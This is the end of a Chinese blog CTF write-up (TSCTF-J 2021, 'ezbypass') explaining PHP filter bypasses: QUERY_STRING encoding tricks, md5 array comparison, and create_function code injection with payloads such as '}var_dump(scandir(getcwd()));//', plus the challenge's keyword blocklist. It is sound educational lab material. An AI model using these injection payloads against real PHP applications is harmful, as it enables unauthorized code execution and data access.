class="string">&#x27;/flag|fi|arra|mor|ta|le|he|nl|hex|as|cat|ev|so|shel|ob|st|ma|`|ec|ead|inc|lf|log|np|ess|chr|cal|bin|sh|nt|gh|reve|flip|rand|con|ot|id|pr|info|oct|pi/i&#x27;</span>, <span class="variable">$www2</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;the last one!&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$a</span> + <span class="variable">$b</span> + <span class="variable">$c</span> != <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;!&#x27;</span>);    </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//flag在同目录下</span></span><br><span class="line">        <span class="variable">$www1</span>(<span class="string">&#x27;&#x27;</span>, <span class="variable">$www2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="第一部分-SERVER-‘QUERY-STRING’-绕过"><a href="#第一部分-SERVER-‘QUERY-STRING’-绕过" class="headerlink" title="第一部分 ( $_SERVER[‘QUERY_STRING’] 绕过)"></a>第一部分 ( <em>$_SERVER[‘QUERY_STRING’]</em> 绕过)</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">    preg_match(<span class="string">&#x27;/flag|www|fi|arra|mor|ta|le|he|nl|hex|as|cat|ev|so|shel|ob|st|ma|ec|ead|inc|1f|log|np|ess|chr|cal|bin|sh|nt|gh|reve|flip|rand|con|ot|id|pr|info|oct|pi/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;1&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​    知识点: <em><strong>$_SERVER[‘QUERY_STRING’]</strong></em> 不会对字符串进行url解码，而get会 <br>    后面传参的时候统一用用16进制加密url就好了，贴一下一个还不错的加密网站<a target="_blank" rel="noopener" href="http://www.jsons.cn/urlcode/">url加密网站</a></p>
+<h3 id="第二部分-preg-match-‘-a-zA-Z-i’-value-绕过"><a href="#第二部分-preg-match-‘-a-zA-Z-i’-value-绕过" class="headerlink" title="第二部分 ( preg_match(‘/[a-zA-Z]/i’, $value 绕过 )"></a>第二部分 ( <em>preg_match(‘/[a-zA-Z]/i’, $value</em> 绕过 )</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_REQUEST</span>) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$_REQUEST</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/[a-zA-Z]/i&#x27;</span>, <span class="variable">$value</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;2&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$a</span> = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​    同<strong>SimplePHP</strong> 第四部分，post传一下即可绕过，就不放payload了 <br>    PS:写wp的时候遇到抽风一直卡在 <em>die(‘2’)</em> ,果断重开浏览器解决问题   /捂嘴笑</p>
+<h3 id="第三部分-md5-强碰撞-数组"><a href="#第三部分-md5-强碰撞-数组" class="headerlink" title="第三部分 ( md5 强碰撞 (数组) )"></a>第三部分 ( <em>md5</em> 强碰撞 (数组) )</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;aaa&#x27;</span>] !== <span class="variable">$_POST</span>[<span class="string">&#x27;bbb&#x27;</span>] &amp;&amp; md5(<span class="variable">$_POST</span>[<span class="string">&#x27;aaa&#x27;</span>]) === md5(<span class="variable">$_POST</span>[<span class="string">&#x27;bbb&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$b</span> = <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;3&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​    又是 <em><strong>md5强碰撞</strong></em> ，不过这一次没有限制必须输入字符串，便有另外一种简单的思路。<br>    由于md5 <strong>无法加密数组</strong> ，在加密数组时都会返回 <em>NULL</em> ，便可以通过POST两个值不同的数组绕过，如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: aaa[]=1&amp;bbb[]=2</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="第四部分-create-function-大的要来了！！！"><a href="#第四部分-create-function-大的要来了！！！" class="headerlink" title="第四部分 ( create_function()  大的要来了！！！)"></a>第四部分 ( <strong>create_function()</strong>  <em>大的要来了！！！</em>)</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/flag|fi|arra|mor|ta|le|he|nl|hex|as|cat|ev|so|shel|ob|st|ma|`|ec|ead|inc|lf|log|np|ess|chr|cal|bin|sh|nt|gh|reve|flip|rand|con|ot|id|pr|info|oct|pi/i&#x27;</span>, <span class="variable">$www1</span>) ||</span><br><span class="line">    preg_match(<span class="string">&#x27;/flag|fi|arra|mor|ta|le|he|nl|hex|as|cat|ev|so|shel|ob|st|ma|`|ec|ead|inc|lf|log|np|ess|chr|cal|bin|sh|nt|gh|reve|flip|rand|con|ot|id|pr|info|oct|pi/i&#x27;</span>, <span class="variable">$www2</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;the last one!&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$a</span> + <span class="variable">$b</span> + <span class="variable">$c</span> != <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;!&#x27;</span>);    </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//flag在同目录下</span></span><br><span class="line">        <span class="variable">$www1</span>(<span class="string">&#x27;&#x27;</span>, <span class="variable">$www2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​    这个部分得重点讲讲</p>
+<p>​    <em>preg_match</em> 过滤了不少关键字，在其中出现过的字符，比如 <em>fi</em> 、<em>cat</em> 、<em>ec</em> 都被ban了无法使用，走一步看一步吧</p>
+<ul>
+<li><em><strong>大的要来了</strong></em></li>
+<li><em><strong>大的来了</strong></em></li>
+<li><em><strong>大的真来了</strong></em></li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$www1</span>(<span class="string">&#x27;&#x27;</span>, <span class="variable">$www2</span>);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>首先引入一个新概念 <strong><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/functions.variable-functions.php">可变函数</a></strong> ，概括一下便是，对于某些函数来说，若变量的值与起函数名相同，则可以看作执行该函数。举个例子， <em>$a=if</em> 时，*$a()* 与 <em>if()</em> <strong>等价</strong> ，这便是解这句话的关键</p>
+</li>
+<li><p>再介绍一个新函数 <strong><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.create-function.php">create_function()</a></strong> ，其用法为</p>
+</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">create_function( <span class="keyword">string</span> <span class="variable">$args</span> , <span class="keyword">string</span> <span class="variable">$code</span> )</span><br><span class="line"><span class="comment">// string $arge 为变量部分</span></span><br><span class="line"><span class="comment">// string $code 为方法代码部分</span></span><br></pre></td></tr></table></figure>
+
+<p>​    光说不练假把式，举个实际的例子</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create_function(<span class="string">&#x27;$cbddl&#x27;</span>,<span class="string">&#x27;echo $cbddl.&quot;dddd&quot;&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>​    与下面的代码相同</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">HAHA</span>(<span class="params"><span class="variable">$cbddl</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$cbddl</span>.<span class="string">&quot;dddd&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​    结合这两点，就可以进行注入了</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$www1</span>(<span class="string">&#x27;&#x27;</span>, <span class="variable">$www2</span>);</span><br></pre></td></tr></table></figure>
+
+<p>​    举个例子，当 <em><strong>www1=create_function&amp;www2=}phpinfo();//</strong></em> 时，payload为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create_function(<span class="string">&#x27;&#x27;</span>,&#125;phpinfo();<span class="comment">//);</span></span><br></pre></td></tr></table></figure>
+
+<p>​    在不考虑关键词过滤的情况下已经可以执行 <em>phpinfo()</em> 了</p>
+<p>​    回到题目中，注意到 <em>flag在同目录下</em> ，于是我先输出了一下目录，payload编码前为  (还要<em>POST</em> www1 和 www2 的值)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www1=create_function&amp;www2=&#125;var_dump(getcwd());<span class="comment">//</span></span><br></pre></td></tr></table></figure>
+
+<p>​    获得路径 <img src="https://cdn.jsdelivr.net/gh/dianzzz/dzimg/data/image-20211025140404795.png" alt="image-20211025140404795">   (顺便贴贴<a target="_blank" rel="noopener" href="https://www.phpernote.com/php-function/1128.html">PHP获取文件目录的方法</a>)</p>
+<p>​    若未被过滤就可以用 <em>file()</em> 来读取，但是很不幸被过滤了，找了一下 <a href="cnblogs.com/Renyi-Fan/p/9099374.html">PHP读取文件内容的方法</a> ，也被ban了:sweat_smile: ，然后就找到另外一篇博客 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/imnzq/p/6796752.html">PHP获取指定目录下的所有文件列表</a> ，尝试了一下里面的 <em>scandir()</em> 函数，A了</p>
+<p>​    payload加密前如下:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: www1=create_function&amp;www2=&#125;var_dump(scandir(getcwd()));<span class="comment">//</span></span><br></pre></td></tr></table></figure>
+
+<p>​    flag来🌶</p>
+<p><img src="https://cdn.jsdelivr.net/gh/dianzzz/dzimg/data/image-20211025142054801.png" alt="image-20211025142054801"></p>
+<hr>
+<hr>
+<blockquote>
+<p>​    打代码的时间真的是过得非常之快，感觉没写点啥一天就过去了。这两天都是早八起床晚一睡觉，又找到了高二在太原集训的感觉(被吊打的感觉也找回来了)。还挺怀念那段时间的，虽然很累，但是为自己喜欢的事情努力的感觉真的挺不错的，累些又算啥，冲他妈的！</p>
+</blockquote>
+<p>[^店長]: 第一次写WP，有什么不足敬请大爹们指出 :yum::heart: :yum:<br>[^time]:2021/10/25</p>
+
+      </div>
+      
+      
+      
+    </div>
+    
+
+    
+    
+    
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#TSCTF-J-2021-WP"><span class="nav-number">1.</span> <span class="nav-text">TSCTF-J 2021  WP</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#King-of-F12"><span class="nav-number">1.1.</span> <span class="nav-text">King  of F12</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SimplePHP"><span class="nav-number">1.2.</span> <span class="nav-text">SimplePHP</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86-md4%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83"><span class="nav-number">1.2.1.</span> <span class="nav-text">第一部分 ( md4弱类型比较 )</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86-preg-match-%E2%80%98-%E2%80%98-GET-%E2%80%98xxx%E2%80%99-%E7%BB%95%E8%BF%87"><span class="nav-number">1.2.2.</span> <span class="nav-text">第二部分 ( preg_match(‘&#x2F;^$&#x2F;‘, $_GET[‘xxx’]) 绕过 )</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%B8%89%E9%83%A8%E5%88%86-md5-%E5%BC%BA%E7%A2%B0%E6%92%9E-string"><span class="nav-number">1.2.3.</span> <span class="nav-text">第三部分 ( md5 强碰撞 (string) )</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E5%9B%9B%E9%83%A8%E5%88%86-REQUEST-%E7%BB%95%E8%BF%87"><span class="nav-number">1.2.4.</span> <span class="nav-text">第四部分 ( $_REQUEST 绕过 )</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%BA%94%E9%83%A8%E5%88%86-file-get-contents-file-%E8%AF%A6%E8%A7%A3"><span class="nav-number">1.2.5.</span> <span class="nav-text">第五部分 ( file_get_contents($file) 详解 )</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E4%BE%8B%E5%AD%90-%E5%81%87%E8%AE%BEtext-txt%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E5%86%85%E5%AE%B9%E4%B8%BAtest"><span class="nav-number">1.2.5.0.0.1.</span> <span class="nav-text">例子   (假设text.txt文件中的内容为test)</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E8%BE%93%E5%87%BA"><span class="nav-number">1.2.5.0.0.2.</span> <span class="nav-text">输出</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ezbypass"><span class="nav-number">1.3.</span> <span class="nav-text">ezbypass</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86-SERVER-%E2%80%98QUERY-STRING%E2%80%99-%E7%BB%95%E8%BF%87"><span class="nav-number">1.3.1.</span> <span class="nav-text">第一部分 ( $_SERVER[‘QUERY_STRING’] 绕过)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86-preg-match-%E2%80%98-a-zA-Z-i%E2%80%99-value-%E7%BB%95%E8%BF%87"><span class="nav-number">1.3.2.</span> <span class="nav-text">第二部分 ( preg_match(‘&#x2F;[a-zA-Z]&#x2F;i’, $value 绕过 )</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%B8%89%E9%83%A8%E5%88%86-md5-%E5%BC%BA%E7%A2%B0%E6%92%9E-%E6%95%B0%E7%BB%84"><span class="nav-number">1.3.3.</span> <span class="nav-text">第三部分 ( md5 强碰撞 (数组) )</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E5%9B%9B%E9%83%A8%E5%88%86-create-function-%E5%A4%A7%E7%9A%84%E8%A6%81%E6%9D%A5%E4%BA%86%EF%BC%81%EF%BC%81%EF%BC%81"><span class="nav-number">1.3.4.</span> <span class="nav-text">第四部分 ( create_function()  大的要来了！！！)</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">店長</p>
+  <div class="site-description" itemprop="description">背灯和月就花阴，已是十年踪迹十年心。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">9</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">店長</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">29k</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
